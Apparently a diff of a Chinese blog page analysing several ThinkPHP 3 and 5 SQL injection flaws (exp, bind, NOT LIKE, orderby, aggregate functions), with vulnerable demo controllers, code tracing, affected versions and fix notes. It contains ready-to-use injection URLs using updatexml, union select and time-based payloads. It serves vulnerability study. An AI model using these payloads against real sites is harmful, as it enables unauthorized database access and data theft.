+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">UPDATE `users` <span class="keyword">SET</span> `level` <span class="operator">=</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="operator">^</span>(<span class="string">&#x27;0(1)&#x27;</span>)  <span class="keyword">WHERE</span>  `id` <span class="operator">=</span> :where_AND_id</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>官方比较暴力的就直接删除了default语句块，并直接删除了<code>ParseArrayData</code>方法。</p>
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gt3fuqozknj31810kiaiq.jpg" alt="image-20210801133831247"></p>
+<h1 id="ThinkPHP-ParseWhereItem方法注入一"><a href="#ThinkPHP-ParseWhereItem方法注入一" class="headerlink" title="ThinkPHP ParseWhereItem方法注入一"></a>ThinkPHP ParseWhereItem方法注入一</h1><h2 id="漏洞概要-2"><a href="#漏洞概要-2" class="headerlink" title="漏洞概要"></a>漏洞概要</h2><p>本次漏洞存在于 <strong>Mysql</strong> 类的 <strong>parseWhereItem</strong> 方法中。由于程序没有对数据进行很好的过滤，直接将数据拼接进 <strong>SQL</strong> 语句。再一个， <strong>Request</strong> 类的 <strong>filterValue</strong> 方法漏过滤 <strong>NOT LIKE</strong> 关键字，最终导致 <strong>SQL注入漏洞</strong> 的产生(<strong>select</strong> 方法注入) </p>
+<p>漏洞影响版本： <strong>ThinkPHP&lt;5.0.10</strong> [外面都说的是=5.0.10，具体原因后面会说]</p>
+<h2 id="漏洞环境-2"><a href="#漏洞环境-2" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = input(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">        <span class="variable">$data</span> = db(<span class="string">&#x27;users&#x27;</span>)-&gt;where([<span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$username</span>])-&gt;select();</span><br><span class="line">        var_dump(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>访问<code>http://yoursite/index.php/index/index?username[0]=not like&amp;username[1][0]=%%&amp;username[1][1]=233&amp;username[2]=) union select 1,user()#</code></p>
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gt3fuw6spzj31810idthw.jpg" alt="image-20210801185650811"></p>
+<h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>老样子因为漏洞不在where所以直接来到select方法</p>
+<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gt3fv31e8kj30xa0qa16z.jpg" alt="image-20210801232202894"></p>
+<p>进入<code>$sql = $this-&gt;builder-&gt;select($options)</code></p>
+<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gt3fv8noi2j31340eswns.jpg" alt="image-20210801232415309"></p>
+<p>再进入<code>parseWhere</code>方法中的<code>$this-&gt;buildWhere-&gt;parseWhereItem</code>。</p>
+<p>这里代码太多我就截取关键点说一下</p>
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gt3fvdluckj312n0ntapq.jpg" alt="image-20210802110129618"></p>
+<p>因为$value是array可控，没有过滤。所以导致拼接造成我们的SQL注入。</p>
+<p>最后用七月火师傅的图来总结一下</p>
+<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gt3fvogs3jj31041fgx08.jpg" alt="9 (1)"></p>
+<h2 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>官方修复在<strong>Request.php</strong> 文件的 <strong>filterValue</strong> 方法中，过滤掉 <strong>NOT LIKE</strong> 关键字[图来自七月火师傅]</p>
+<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gt3fvv3s45j31040l4ds6.jpg" alt="2"></p>
+<p>下图是七月师傅所述的</p>
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gt3fw6wmyij30w00mz16m.jpg" alt="image-20210801230301980"></p>
+<p>七月火师傅在漏洞修复说的是5.0.10以前是不存在的是因为他把<code>in_array</code>搜寻的东西搞错了</p>
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gt3fwd39jyj30wf0ksgw6.jpg" alt="image-20210801222712031"></p>
+<p>5.0.9复现过程</p>
+<p><img src="https://tva1.sinaimg.cn/large/00774lbQly1gt3fwilan2j315k0ko4dq.jpg" alt="image-20210801230139228"></p>
+<p>所以我认为关键点在这里</p>
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gt3fwobi2qj313n0n5wv7.jpg" alt="image-20210801225926634"></p>
+<h1 id="ThinkPHP-ParseWhereItem方法注入二"><a href="#ThinkPHP-ParseWhereItem方法注入二" class="headerlink" title="ThinkPHP ParseWhereItem方法注入二"></a>ThinkPHP ParseWhereItem方法注入二</h1><h2 id="漏洞概要-3"><a href="#漏洞概要-3" class="headerlink" title="漏洞概要"></a>漏洞概要</h2><p>本次漏洞存在于 <strong>Mysql</strong> 类的 <strong>parseWhereItem</strong> 方法中。由于程序没有对数据进行很好的过滤，将数据拼接进 <strong>SQL</strong> 语句，导致 <strong>SQL注入漏洞</strong> 的产生（ <strong>select</strong> 方法注入）</p>
+<p>漏洞影响版本： <strong>ThinkPHP5全版本</strong> 。</p>
+<h2 id="漏洞环境-3"><a href="#漏洞环境-3" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = request()-&gt;get(<span class="string">&#x27;username&#x27;</span>);</span><br><span class="line">        <span class="variable">$data</span> = db(<span class="string">&#x27;users&#x27;</span>)-&gt;where(<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;exp&#x27;</span>,<span class="variable">$username</span>)-&gt;select();</span><br><span class="line">        var_dump(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>介绍一下where中的exp吧</p>
 <p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gsxo53cothj30zx0lq47e.jpg" alt="image-20210728135932523"></p>
 <p>例如下面两条语句是完全相等的。</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$map</span>[<span class="string">&#x27;username&#x27;</span>]  = <span class="keyword">array</span>(<span class="string">&#x27;in&#x27;</span>,<span class="string">&#x27;admin,r0ser1&#x27;</span>);</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$map</span>[<span class="string">&#x27;username&#x27;</span>]  = <span class="keyword">array</span>(<span class="string">&#x27;exp&#x27;</span>,<span class="string">&#x27; IN (admin,r0ser1) &#x27;</span>);</span><br></pre></td></tr></table></figure>
 
-<p>所以我们这时候传入数组即可，使用exp模式传入POC来直接跟进代码。</p>
-<p>我们F7直接跟进where</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$data</span>=M(<span class="string">&#x27;users&#x27;</span>)-&gt;where([<span class="string">&quot;username&quot;</span> =&gt; <span class="variable">$username</span>])-&gt;select();</span><br></pre></td></tr></table></figure>
+<p>访问<code>http://yoursite/index.php/index?username=) union select updatexml(1,concat(0x7,user(),0x7e),1)%23</code></p>
+<p>即可触发 <strong>SQL注入漏洞</strong> 。（没开启 <strong>app_debug</strong> 是无法看到 <strong>SQL</strong> 报错信息的）</p>
+<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gt3fwzysbrj31ez0g9k39.jpg" alt="image-20210802112424358"></p>
+<h2 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>因为都是<strong>parseWhereItem</strong> 出现的问题上面一文分析过了一些点，我们这次只看关键点。</p>
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gt3fx4lok0j31250m6h1o.jpg" alt="image-20210802141447461"></p>
+<h2 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>官方无修复，并不承认这是一个漏洞认为这是他们提供的一个功能。</p>
+<h1 id="ThinkPHP-orderby-方法注入"><a href="#ThinkPHP-orderby-方法注入" class="headerlink" title="ThinkPHP orderby 方法注入"></a>ThinkPHP <strong>orderby</strong> 方法注入</h1><p>漏洞存在于 <strong>Builder</strong> 类的 <strong>parseOrder</strong> 方法中。由于程序没有对数据进行很好的过滤，直接将数据拼接进 <strong>SQL</strong> 语句，最终导致 <strong>SQL注入漏洞</strong> 的产生。</p>
+<p>漏洞影响版本： <strong>5.1.16&lt;=ThinkPHP5&lt;=5.1.22</strong> 。</p>
+<h2 id="漏洞环境-4"><a href="#漏洞环境-4" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$orderby</span> = request()-&gt;get(<span class="string">&#x27;orderby&#x27;</span>);</span><br><span class="line">        <span class="variable">$result</span> = db(<span class="string">&#x27;users&#x27;</span>)-&gt;where([<span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;R0ser1&#x27;</span>])-&gt;order(<span class="variable">$orderby</span>)-&gt;find();</span><br><span class="line">        var_dump(<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>需要注意的位置</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$resultSet</span>  = <span class="keyword">$this</span>-&gt;db-&gt;select(<span class="variable">$options</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="keyword">$this</span>-&gt;parseSql(<span class="keyword">$this</span>-&gt;selectSql,<span class="variable">$options</span>);</span><br></pre></td></tr></table></figure>
+<p>访问<strong><a href="http://localhost:8000/index/index/index?orderby%5Bid%60%7Cupdatexml(1,concat(0x7,user(),0x7e),1)%23%5D=1">http://localhost:8000/index/index/index?orderby[id`|updatexml(1,concat(0x7,user(),0x7e),1)%23]=1</a></strong></p>
+<p>即可触发 <strong>SQL注入漏洞</strong> 。（没开启 <strong>app_debug</strong> 是无法看到 <strong>SQL</strong> 报错信息的）</p>
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gt3fxccajnj31em0ewtj4.jpg" alt="image-20210802212151951"></p>
+<h2 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞出现在order嘛那我们直接看order函数。截取关键部分</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">public function order($field, $order = null)  //$field是我们传入的值</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;order&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;order&#x27;</span>] = [];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (is_array(<span class="variable">$field</span>)) &#123;  </span><br><span class="line">        <span class="comment">//传入的是一个数组 进行合并然后赋值给$this-&gt;option</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;order&#x27;</span>] = array_merge(<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;order&#x27;</span>], <span class="variable">$field</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;order&#x27;</span>][] = <span class="variable">$field</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>; <span class="comment">//返回this this包含了$field </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>跟进到<code>Libray\Think\Driver.class.php</code>文件中的976行，<code>ParseSql</code>进行替换表达式</p>
-<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gsxo58n26oj319t0fbk6h.jpg" alt="image-20210728140841571"></p>
-<p>我们跟进到<code>parseWhereItem</code>函数  // 重点</p>
-<p><img src="https://tvax3.sinaimg.cn/large/00774lbQly1gsxo5dli2wj31c50kowu7.jpg" alt="image-20210728141624920"></p>
-<p>可以看到当<code>$exp==exp</code>时直接进行拼接，没有任何的过滤。所以导致了我们的SQL注入。</p>
-<p>现在我们来分析一下 <code>I函数</code> 在<code>I函数</code>内部的<code>think_filter</code>中，对exp进行了正则匹配，如果匹配到了会在其后面加空格，所以我们也就无法让<code>$exp==exp</code>了进而无法拼接SQL语句</p>
-<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gsxo5iiow1j315t068tc0.jpg" alt="image-20210728142713456"></p>
-<h1 id="bind注入"><a href="#bind注入" class="headerlink" title="bind注入"></a>bind注入</h1><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>使用代码如下</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$con</span>[<span class="string">&#x27;username&#x27;</span>]=I(<span class="string">&#x27;username&#x27;</span>);</span><br><span class="line">        <span class="variable">$data</span>[<span class="string">&#x27;passwd&#x27;</span>]=I(<span class="string">&#x27;passwd&#x27;</span>);</span><br><span class="line">        <span class="variable">$res</span>=M(<span class="string">&#x27;users&#x27;</span>)-&gt;where(<span class="variable">$con</span>)-&gt;save(<span class="variable">$data</span>);</span><br><span class="line">        dump(<span class="variable">$res</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后再进入find函数，在 <strong>Connection</strong> 类的 <strong>find</strong> 方法中调用 <strong>Builder</strong> 类的 <strong>select</strong> 方法来生成 <strong>SQL</strong> 语句。相信大家对 <strong>Builder</strong> 类的 <strong>select</strong> 方法应该就不陌生了。前几篇分析文章中都有提及这个方法。这个方法通过 <strong>str_replace</strong> 函数将数据填充到 <strong>SQL</strong> 模板语句中。这次我们要关注的是 <strong>parseOrder</strong> 方法，这个方法在新版的 <strong>ThinkPHP</strong> 中做了代码调整，我们跟进。</p>
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gt3fxi3hkrj30kw0fl0z0.jpg" alt="image-20210802214231432"></p>
+<p>在 <strong>parseOrder</strong> 方法中，我们看到程序通过 <strong>parseKey</strong> 方法给变量两端都加上了反引号。然后直接拼接字符串返回没有任何过滤</p>
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gt3fxmmvv4j30v10ig7fp.jpg" alt="image-20210802215520276"></p>
+<p>导致我们最终的SQL语句就是</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM &#96;users&#96; WHERE  &#96;username&#96; &#x3D; :where_AND_username ORDER BY &#96;id&#96;|updatexml(1,concat(0x7,user(),0x7e),1)#&#96; LIMIT 1  </span><br></pre></td></tr></table></figure>
 
-<p>payload</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username[0]&#x3D;bind&amp;username[1]&#x3D;0 and 1&#x3D;(updatexml(1,concat(0x3a,(user())),1))&amp;passwd&#x3D;admin</span><br></pre></td></tr></table></figure>
+<p>[七月火前辈总结]</p>
+<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gt3fxuqwscj31040zjqh6.jpg" alt="8"></p>
+<h2 id="漏洞修复-4"><a href="#漏洞修复-4" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>官方pass掉了了<code>)</code>和<code>#</code>，进行了修复。</p>
+<p><img src="https://tvax4.sinaimg.cn/large/00774lbQly1gt3fy1n4bcj31ew0iz7cm.jpg" alt="20210308213321144"></p>
+<h1 id="ThinkPHP-聚合查询注入"><a href="#ThinkPHP-聚合查询注入" class="headerlink" title="ThinkPHP 聚合查询注入"></a>ThinkPHP 聚合查询注入</h1><h2 id="漏洞概要-4"><a href="#漏洞概要-4" class="headerlink" title="漏洞概要"></a>漏洞概要</h2><p>本次漏洞存在于所有 <strong>Mysql</strong> 聚合函数相关方法。由于程序没有对数据进行很好的过滤，直接将数据拼接进 <strong>SQL</strong> 语句，最终导致 <strong>SQL注入漏洞</strong> 的产生。</p>
+<p>漏洞影响版本： <strong>5.0.0&lt;=ThinkPHP&lt;=5.0.21</strong> 、 <strong>5.1.3&lt;=ThinkPHP5&lt;=5.1.25</strong> 。</p>
+<p>不同版本 <strong>payload</strong> 需稍作调整：</p>
+<p><strong>5.0.0~5.0.21</strong>、 <strong>5.1.3～5.1.10</strong> ： <strong>id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</strong></p>
+<p><strong>5.1.11～5.1.25</strong> ： <strong>id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</strong></p>
+<h2 id="漏洞环境-5"><a href="#漏洞环境-5" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 这里用5.0.10复现学习</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$count</span> = input(<span class="string">&#x27;get.count&#x27;</span>);</span><br><span class="line">        <span class="variable">$res</span> = db(<span class="string">&#x27;users&#x27;</span>)-&gt;count(<span class="variable">$count</span>);</span><br><span class="line">        var_dump(<span class="variable">$res</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gsxo5nu5gij31ey0h6qeu.jpg" alt="image-20210728163342719"></p>
-<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们直接到进入<code>ThinkPHP/Library/Think/Model.class.php</code>：451跟进去</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$result</span>  = <span class="keyword">$this</span>-&gt;db-&gt;update(<span class="variable">$data</span>,<span class="variable">$options</span>);</span><br></pre></td></tr></table></figure>
+<p>聚合函数如下</p>
+<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gt3fyd093xj30zt0fdjyq.jpg" alt="image-20210802160108583"></p>
+<p>访问<code> http://yoursite/index/index/index?data=id),(updatexml(1,concat(0x7,user(),0x7e),1)%23</code> 链接，即可触发 <strong>SQL注入漏洞</strong> 。（没开启 <strong>app_debug</strong> 是无法看到 <strong>SQL</strong> 报错信息的，当然我们也可以构造其他的语句）</p>
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gt3fyhgtilj618v0edn7c02.jpg" alt="image-20210802160943057"></p>
+<p>例如延时注入等</p>
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gt3fylunssj61f10iotk202.jpg" alt="image-20210802160801138"></p>
+<h2 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们直接到count方法这里</p>
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gt3fyqmr1rj31320f6tis.jpg" alt="image-20210802162304476"></p>
+<p>我们发现$this-&gt;value(里面的东西没有任何的过滤)直接拼接起来传递给value方法我们跟进看一下</p>
+<p><img src="https://tva2.sinaimg.cn/large/00774lbQly1gt3fyv8nxoj310w0dek0k.jpg" alt="image-20210802163731112"></p>
+<p>跟到$this-&gt;builder-&gt;select方法如下</p>
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gt3fyzcw7lj31600g4wou.jpg" alt="image-20210802163839070"></p>
+<p>$this-&gt;parseField</p>
+<p><img src="https://tva3.sinaimg.cn/large/00774lbQly1gt3fz3zj08j315o0dntgb.jpg" alt="image-20210802164244552"></p>
+<p>$this-&gt;parseKey</p>
+<p><img src="https://tvax2.sinaimg.cn/large/00774lbQly1gt3fz9qv0rj31500knk5m.jpg" alt="image-20210802164225976"></p>
+<p>返回之后都赋值给array数组，然后再通过<code>$fieldsStr = implode(&#39;,&#39;, $array)</code>又把我们数组给拼接成字符串最终返回的语句如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT COUNT(id),(updatexml(1,concat(0x7,user(),0x7e),1)) AS tp_count FROM &#96;users&#96; LIMIT 1  </span><br></pre></td></tr></table></figure>
 
-<p>然后来到<code>ThinkPHP/Library/Think/Driver.class.php</code>:893</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;parseBind(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;bind&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;bind&#x27;</span>]:<span class="keyword">array</span>());</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseBind</span>(<span class="params"><span class="variable">$bind</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;bind  =  array_merge(<span class="keyword">$this</span>-&gt;bind,<span class="variable">$bind</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>使的<code>bind</code>为空数组 继续跟进<code>$this-&gt;parseSet($data);</code></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>   = <span class="string">&#x27;UPDATE &#x27;</span> . <span class="variable">$table</span> . <span class="keyword">$this</span>-&gt;parseSet(<span class="variable">$data</span>);   <span class="comment">//895行</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://tva4.sinaimg.cn/large/00774lbQly1gsxo5tsjyaj30yt0cyqbk.jpg" alt="image-20210728165647886"></p>
-<p>进入<code>bindParam</code>中，将我们的this-&gt;bind设置为<code>:0=admin</code></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">protectedfunction bindParam(<span class="variable">$name</span>,<span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;bind[<span class="string">&#x27;:&#x27;</span>.<span class="variable">$name</span>]  =   <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>来到<code>parseWhere</code>函数进行一些赋值等操作 </p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> .= <span class="keyword">$this</span>-&gt;parseWhere(!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]:<span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
-<p>跟进行后漏洞重点在于<code>ThinkPHP/Library/Think/Db/Driver.class.php:547</code>中</p>
-<p><img src="https://tvax1.sinaimg.cn/large/00774lbQly1gsxo5yucepj31d90hhnaj.jpg" alt="image-20210728164542988"></p>
-<p>于是我们的SQL语句变成了</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">UPDATE `users` <span class="keyword">SET</span> `passwd`<span class="operator">=</span>:<span class="number">0</span> <span class="keyword">WHERE</span> `username` <span class="operator">=</span> :<span class="number">0</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x3a</span>,(<span class="keyword">user</span>())),<span class="number">1</span>))</span><br></pre></td></tr></table></figure>
-
-<p>然后回到<code>Driver.class.php</code>进入906</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;execute(<span class="variable">$sql</span>,!<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;fetch_sql&#x27;</span>]) ? <span class="literal">true</span> : <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
-
-<p>然后对<code>:0</code>进行了替换</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"><span class="variable">$str</span>,<span class="variable">$fetchSql</span>=<span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;initConnect(<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="keyword">$this</span>-&gt;_linkID ) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;queryStr = <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;bind))&#123;</span><br><span class="line">        <span class="variable">$that</span>   =   <span class="keyword">$this</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;queryStr =   strtr(<span class="keyword">$this</span>-&gt;queryStr,array_map(<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$val</span></span>) <span class="title">use</span>(<span class="params"><span class="variable">$that</span></span>)</span>&#123; <span class="keyword">return</span> <span class="string">&#x27;\&#x27;&#x27;</span>.<span class="variable">$that</span>-&gt;escapeString(<span class="variable">$val</span>).<span class="string">&#x27;\&#x27;&#x27;</span>; &#125;,<span class="keyword">$this</span>-&gt;bind));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>于是我们的SQL语句也就变成了</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">UPDATE `users` <span class="keyword">SET</span> `passwd`<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="keyword">WHERE</span> `username` <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x3a</span>,(<span class="keyword">user</span>())),<span class="number">1</span>))</span><br></pre></td></tr></table></figure>
-
-<p>这就是为什么我们需要将payload中username[1]设置为0的原因</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username[0]&#x3D;bind&amp;username[1]&#x3D;0</span><br></pre></td></tr></table></figure>
-
-<h1 id="find-select-delete-注入"><a href="#find-select-delete-注入" class="headerlink" title="find(),select(),delete()注入"></a>find(),select(),delete()注入</h1><h2 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这里只举例Find其他同理</p>
-<p>测试代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$res</span>=M(<span class="string">&#x27;users&#x27;</span>)-&gt;find(I(<span class="string">&#x27;id&#x27;</span>));</span><br><span class="line">        dump(<span class="variable">$res</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>exp</p>
